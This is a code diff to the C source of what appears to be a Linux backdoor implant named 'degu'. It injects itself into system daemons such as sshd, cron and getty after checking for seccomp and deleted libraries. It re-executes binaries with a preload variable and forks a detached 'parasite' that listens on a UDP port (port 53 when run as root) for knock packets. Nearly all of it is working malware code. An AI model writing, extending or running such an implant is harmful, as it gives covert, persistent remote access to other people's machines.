@@ -8,7 +8,6 @@
 #include <netinet/ip.h>
 #include <net/ethernet.h>
 #include <sys/stat.h>
-#include <string.h>
 #include <dirent.h>
 #include <inttypes.h>
 #include <errno.h>
@@ -17,7 +16,7 @@
 static int sock = -1;
 static int run = 1;
 
-#define CANDSIZE 9
+#define CANDSIZE 11
 char *candidate[CANDSIZE]= {
     "udev",
     "cron",
@@ -26,7 +25,9 @@ char *candidate[CANDSIZE]= {
     "containerd",
     "sshd",
     "getty",
+    "agetty",
     "dhcp",
+    "master",
     NULL
 };
 
@@ -45,11 +46,13 @@ int check_deletedlibs(char *pid){
     char line[2048] = {0};
     sprintf(maps,"/proc/%s/maps",pid);
     FILE *f = fopen(maps,"r");
-    if( f == NULL ) return 1;
+    if( f == NULL ) 
+        return 1;
     while( fgets(line,2048,f) ) {
         if(strstr(line,"(deleted)") != NULL )
             ret = 1;
     }
+    fclose(f);
     return ret;
 }
 
@@ -80,6 +83,7 @@ int check_seccomp(char* pid){
             }
         }
     }
+    fclose(f);
     if (seccompf > 1 )
         return 1;
     if (seccomp > 2 )
@@ -125,8 +129,9 @@ void findproc(){
                                 readlink("/proc/self/exe",dso,4096);
                                 pid_t target = atoi(pid);
                                 TRACE("injecting into %i",target);
-                                inject(target,dso);
-                                _exit(0);
+                                int ret = inject(target,dso);
+                                if (ret == 0)
+                                    _exit(0);
                             }
                             i++;
                         }
@@ -196,135 +201,120 @@ void sig_alrm(int signum){
     }
 }
 
-void parasite(int port){
-    TRACE("inside parasite %i",port);
-    unsetenv(PRELOAD);
-    unsetenv(PORT);
-    struct sockaddr_in saddr, caddr;
-    socklen_t clen = sizeof(caddr);
-    setup_keys();
-    int ssock;
-    if ((ssock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
-        exit(EXIT_FAILURE);
-    }
-    
-    memset(&saddr, 0, sizeof(saddr));
-    saddr.sin_family = AF_INET;
-    saddr.sin_addr.s_addr = INADDR_ANY;
-    saddr.sin_port = htons(port);
-    
-    if (bind(ssock, (struct sockaddr *)&saddr, sizeof(saddr)) == -1) {
-        close(ssock);
-        exit(EXIT_FAILURE);
-    }
-    
-    unsigned char buffer[1500];
-
-    while (1) {
-        memset(buffer,0,1500);
-        unsigned char *towrite = buffer + STRIPUDP;
-        int i = recvfrom(ssock, towrite, 1500 - STRIPUDP , 0, (struct sockaddr *)&caddr, &clen);
-        TRACE("recv %i ",i);
-        knock(buffer,i+STRIPUDP);
-    }
-    exit(EXIT_SUCCESS);
-}
 
 DEGU_FUNC_INIT void degu(){
 
     if( getenv(PRELOAD) != NULL ){
-        unsetenv(PRELOAD);
-        int port = atoi(getenv(PORT));
+        int port = 0;
+        
+        if (getuid() == 0)
+            port=53;
+        
+        if (getenv(PORT) != NULL)
+            port = atoi(getenv(PORT));
+
         if(port == 0 )
-            exit(EXIT_FAILURE);
+            return;
+
         pid_t pid = fork();
         if (pid == 0) {
             setsid();
             pid_t pid2 = fork();
             if (pid2 == 0) {
                 setsid();
-                parasite(port);
+                parasite(port, 1);
             }
-            exit(EXIT_SUCCESS);
-        }else{
-            exit(EXIT_SUCCESS);
         }
+        exit(EXIT_FAILURE);
     }
     
     if ( getenv(LIB_BYPASS) != NULL )
         return;
 
-    if(getuid() != 0)
-        return;
-
-    setup_keys();
-    signal(SIGALRM,sig_alrm);
-    alarm(WAKE);
-}
-
-int isexecok(const char *filename) {
-    if (access(filename, F_OK|X_OK) != -1) {
-        return 1;
-    } else {
-        return 0;
+    if(getuid() == 0){
+        setup_keys();
+        signal(SIGALRM,sig_alrm);
+        alarm(WAKE);
     }
 }
 
 
-void usereffort(int port,char *bin){
-    if (isexecok(bin) == 1){
-        TRACE("user effort %i %s",port,bin);
-        char dso[2048] =  {0};
-        readlink("/proc/self/exe",dso,2048);
+/**
+ * Command usage
+ 
+  # ./degu.so
+    uid == 0 && findproc
+  
+  # ./degu.so <pid>
+    uid == 0 && pid to inject
 
-        char preload[4096] = {0};
-        char eport[512] = {0};
-        sprintf(preload,"%s=%s",PRELOAD,dso);
-        sprintf(eport,"%s=%i",PORT,port);
-        char **env = (char **)malloc(3 * sizeof(char *));
-        env[0] = preload;
-        env[1] = eport;
-        env[2] = NULL;
-        execle(bin,bin,NULL,env);
-    }
-}
+  #/$ ./degu.so <port> <bin>
+  uid == 0/1000 && port && bin to infect
+
+  $ ./degu.so <port>
+  uid == 1000 && port to listen to
+
+ * 
+ * 
+ * 
+ * 
+ */
 
 int main(int argc,char *argv[]){
+    
+    char *bypass = getenv(LIB_BYPASS);
 
-    if (getuid() != 0){
-        if (argc != 3)
-            exit(EXIT_FAILURE);
-        int port = atoi(argv[1]);
-        if (port < 1024)
-            exit(EXIT_FAILURE);
+    if ((bypass == NULL ) && (getuid() == 0)){
         
-        char *bin = strdup(argv[2]);
-
-        usereffort(port,bin);
-        exit(EXIT_SUCCESS); 
+        if (argc == 1){
+            findproc();
+        }else if (argc == 2){         
+            char dso[4096] =  {0};
+            readlink("/proc/self/exe",dso,4096);
+            char *pid = argv[1];
+            TRACE("trying injecting pid %s  ",pid);
+            pid_t target = atoi(pid);
+            
+            if ( check_seccomp(pid) == 1 ){
+                printf(":/\n"); 
+                exit(-103); 
+            }
+            if ( check_deletedlibs(pid) == 1){
+                printf(":\\\n");
+                exit(-104); 
+            }
+            TRACE("%s %i",dso,target);
+            
+            int fail = inject(target,dso);
+            exit(fail); 
+        }
     }
-
-    if (argc == 1)
-        findproc();
-
-    if (argc != 2)
-        exit(EXIT_FAILURE);
-
-    char dso[4096] =  {0};
-    readlink("/proc/self/exe",dso,4096);
-    char *pid = argv[1];
-    pid_t target = atoi(pid);
-    
-    if ( check_seccomp(pid) == 1 ){
-        printf(":/\n"); 
-        exit(-1003); 
+    if (bypass == NULL ){
+        if (argc == 3){
+            TRACE("trying usereffort ");
+            int port = atoi(argv[1]);
+            if (port < 1024)
+                exit(EXIT_FAILURE);
+            char *bin = strdup(argv[2]);
+            usereffort(port,bin);
+            exit(EXIT_SUCCESS); 
+        }else if(argc == 2 ){
+            int port = atoi(argv[1]);
+            if (port < 1024)
+                exit(EXIT_FAILURE);
+            pid_t pid = fork();
+            if (pid == 0) {
+                setsid();
+                pid_t pid2 = fork();
+                if (pid2 == 0) {
+                    setsid();
+                    parasite(port, 1);
+                }
+                exit(EXIT_SUCCESS);
+            }
+            exit(EXIT_SUCCESS);
+        } else {
+            exit(EXIT_FAILURE); 
+        }
     }
-    if ( check_deletedlibs(pid) == 1){
-        printf(":\\\n");
-        exit(-1004); 
-    }
-    TRACE("%s %i",dso,target);
-    
-    int fail = inject(target,dso);
-    exit(fail); 
 }
